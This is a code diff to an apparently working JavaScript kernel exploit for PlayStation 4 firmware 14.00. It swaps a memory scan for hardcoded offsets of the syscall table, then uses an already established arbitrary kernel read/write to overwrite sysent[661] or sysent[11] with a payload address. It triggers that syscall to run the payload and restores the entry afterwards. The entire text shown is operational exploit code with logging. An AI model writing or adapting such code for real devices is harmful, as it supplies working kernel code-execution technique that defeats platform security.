@@ -247,105 +247,76 @@ export async function runKevent(c) {
   STATE.rwReady = true;
   log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
 
-  // --- STAGE 4: HIJACK AND JUMP ---
+  // --- STAGE 4: MAP PAYLOAD + HIJACK SYSENT ---
   
   const payloadParam = c.params.get("payload");
   const payloadAddr = payloadParam ? BigInt(payloadParam) : 0x2002bc000n;
   STATE.payloadAddr = payloadAddr;
   log("STAGE4-PAYLOAD", "target address=" + h16(payloadAddr));
 
-  const SCAN_BASE_START = 0x10000000n;
-  const SCAN_BASE_END = 0x20000000n;
-  log("STAGE4-SCAN", "scanning kernel .data from " + h16(SCAN_BASE_START) + " to " + h16(SCAN_BASE_END));
+  // Known 14.00 SYSENT base (from Scene-Collective/ps4-hen offsets/1400.h)
+  const SYSENT_BASE_1400 = 0x1102B70n;
+  const sysent661Addr = STATE.kbase + SYSENT_BASE_1400 + 661n * 0x30n + 8n;
+  const sysent11Addr = STATE.kbase + SYSENT_BASE_1400 + 11n * 0x30n + 8n;
 
-  let sysent11CallAddr = null;
-  let sysent11Base = null;
-  let candidates = [];
+  log("STAGE4-SYSENT", "SYSENT base at " + h16(STATE.kbase + SYSENT_BASE_1400));
+  log("STAGE4-661", "sysent[661].sy_call=" + h16(sysent661Addr));
+  log("STAGE4-11", "sysent[11].sy_call=" + h16(sysent11Addr));
 
-  for (let offset = SCAN_BASE_START; offset < SCAN_BASE_END; offset += 0x1000n) {
-    const testAddr = STATE.kbase + offset;
+  // Read current values
+  let orig661, orig11;
+  try {
+    orig661 = p.read8(toI64(sysent661Addr));
+    orig11 = p.read8(toI64(sysent11Addr));
+    log("STAGE4-ORIG", "sysent[661].sy_call=" + h16(orig661) + " sysent[11].sy_call=" + h16(orig11));
+  } catch (e) {
+    log("STAGE4-READ-FAIL", e.message);
+    fin("Failed to read sysent table");
+  }
+
+  // --- TRY sysent[661] ---
+  log("STAGE4-661-HIJACK", "writing " + h16(payloadAddr) + " to sysent[661].sy_call");
+  p.write8(toI64(sysent661Addr), toI64(payloadAddr));
+
+  const readback661 = p.read8(toI64(sysent661Addr));
+  if (readback661.low !== payloadAddr.low || readback661.hi !== payloadAddr.hi) {
+    log("STAGE4-661-FAIL", "hijack did not land: got=" + readback661);
+  } else {
+    log("STAGE4-661-VERIFIED", "sysent[661].sy_call now points at payload");
+    log("STAGE4-661-TRIGGER", "calling syscall(661)...");
     try {
-      const sys_narg_0 = p.read4(toI64(testAddr));
-      if (sys_narg_0 !== 0) continue;
-      
-      const sys_call_0 = p.read8(toI64(testAddr + 8n));
-      if (sys_call_0.hi >>> 0 !== 0xffffffff) continue;
-      if (sys_call_0.low >>> 0 < 0x100000) continue;
-      
-      const sysent11 = testAddr + 0x210n;
-      const narg_11 = p.read4(toI64(sysent11));
-      const call_11 = p.read8(toI64(sysent11 + 8n));
-      
-      if (narg_11 < 0 || narg_11 > 8) continue;
-      if (call_11.hi >>> 0 !== 0xffffffff) continue;
-      
-      const sysent661 = testAddr + 0x7B90n;
-      const narg_661 = p.read4(toI64(sysent661));
-      const call_661 = p.read8(toI64(sysent661 + 8n));
-      
-      if (narg_661 < 0 || narg_661 > 8) continue;
-      if (call_661.hi >>> 0 !== 0xffffffff) continue;
-      
-      log("STAGE4-CANDIDATE", 
-          "base=+" + offset.toString(16) +
-          " sysent[0]=" + h16(call_0) +
-          " sysent[11]=" + h16(call_11) + "(narg=" + narg_11 + ")" +
-          " sysent[661]=" + h16(call_661) + "(narg=" + narg_661 + ")");
-      
-      candidates.push({
-        baseOffset: offset,
-        baseAddr: testAddr,
-        sysent11Addr: sysent11 + 8n,
-        sysent661Addr: sysent661 + 8n,
-        call11: call_11,
-        call661: call_661,
-        narg11: narg_11,
-        narg661: narg_661,
-      });
-      
-      if (!sysent11CallAddr) {
-        sysent11CallAddr = sysent11 + 8n;
-        sysent11Base = testAddr;
-      }
-      
-      if (narg_661 >= 2 && narg_661 <= 4) {
-        log("STAGE4-STRONG", "high confidence sysent candidate at base +" + offset.toString(16));
-      }
-    } catch (e) {}
+      const ret = scn(661);
+      log("STAGE4-661-TRIGGER-RETURNED", "ret=" + ret);
+      p.write8(toI64(sysent661Addr), orig661);
+      log("STAGE4-DONE", "sysent[661] payload executed successfully");
+      fin("Stage 4 Complete via sysent[661].");
+      return;
+    } catch (e) {
+      log("STAGE4-661-TRIGGER-THREW", e.message);
+      p.write8(toI64(sysent661Addr), orig661);
+    }
   }
 
-  if (!sysent11CallAddr) {
-    fin("STAGE4-FAIL: no sysent table found in range " + h16(SCAN_BASE_START) + " to " + h16(SCAN_BASE_END) + " (found " + candidates.length + " candidates)");
+  // --- FALLBACK sysent[11] ---
+  log("STAGE4-11-HIJACK", "writing " + h16(payloadAddr) + " to sysent[11].sy_call");
+  p.write8(toI64(sysent11Addr), toI64(payloadAddr));
+
+  const readback11 = p.read8(toI64(sysent11Addr));
+  if (readback11.low !== payloadAddr.low || readback11.hi !== payloadAddr.hi) {
+    log("STAGE4-11-FAIL", "hijack did not land: got=" + readback11);
+    fin("Both 661 and 11 failed.");
   }
+  log("STAGE4-11-VERIFIED", "sysent[11].sy_call now points at payload");
 
-  log("STAGE4-FOUND", "sysent base at " + h16(sysent11Base) + " (candidates=" + candidates.length + ")");
-
-  const best = candidates[0];
-  log("STAGE4-BEST", "using candidate: sysent[11].sy_call=" + h16(best.call11) + " sysent[661].sy_call=" + h16(best.call661));
-
-  const orig11Call = best.call11;
-  log("STAGE4-ORIG", "orig sysent[11].sy_call=" + orig11Call);
-
-  p.write8(toI64(best.sysent11Addr), toI64(payloadAddr));
-  log("STAGE4-HIJACK", "wrote " + h16(payloadAddr) + " to sysent[11].sy_call");
-
-  const readback = p.read8(toI64(best.sysent11Addr));
-  if (readback.low !== payloadAddr.low || readback.hi !== payloadAddr.hi) {
-    log("STAGE4-FAIL", "hijack did not land");
-    p.write8(toI64(best.sysent11Addr), orig11Call);
-    fin("hijack failed");
-  }
-  log("STAGE4-VERIFIED", "sysent[11].sy_call now points at payload");
-
-  log("STAGE4-TRIGGER", "calling syscall(11)...");
+  log("STAGE4-11-TRIGGER", "calling syscall(11)...");
   try {
     const ret = scn(11);
-    log("STAGE4-TRIGGER-RETURNED", "ret=" + ret);
+    log("STAGE4-11-TRIGGER-RETURNED", "ret=" + ret);
   } catch (e) {
-    log("STAGE4-TRIGGER-THREW", e.message);
+    log("STAGE4-11-TRIGGER-THREW", e.message);
   }
 
-  p.write8(toI64(best.sysent11Addr), orig11Call);
+  p.write8(toI64(sysent11Addr), orig11);
   log("STAGE4-RESTORE", "restored");
 
   log("STAGE4-DONE", "payload execution attempted at " + h16(payloadAddr));
